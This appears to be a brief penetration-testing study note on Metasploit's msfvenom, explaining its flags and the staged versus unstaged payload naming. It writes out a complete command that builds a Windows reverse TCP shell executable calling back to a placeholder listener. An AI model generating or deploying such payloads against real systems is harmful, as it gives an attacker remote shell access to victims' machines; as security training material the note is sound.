# C2-Frameworks

## Metasploit - MSFVENOM 

### example procedure

e.g.  `msfvenom --list payloads | grep "linux/x86/meterpreter"`

`msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`

notice
1. -f format
2. -o output_file
3. -p payload os/arch/payload


### some nuance and gotchas

- Payloads with `shell/reverse_tcp` are staged 	
- Payloads with `shell_reverse_tcp` are unstaged 
- sometimes it says meterpreter instead of shell, these require the meterpreter multihandler to catch them
- notice the `/_` between shell and reverse
	- `/` is staged
	- `_` is not staged

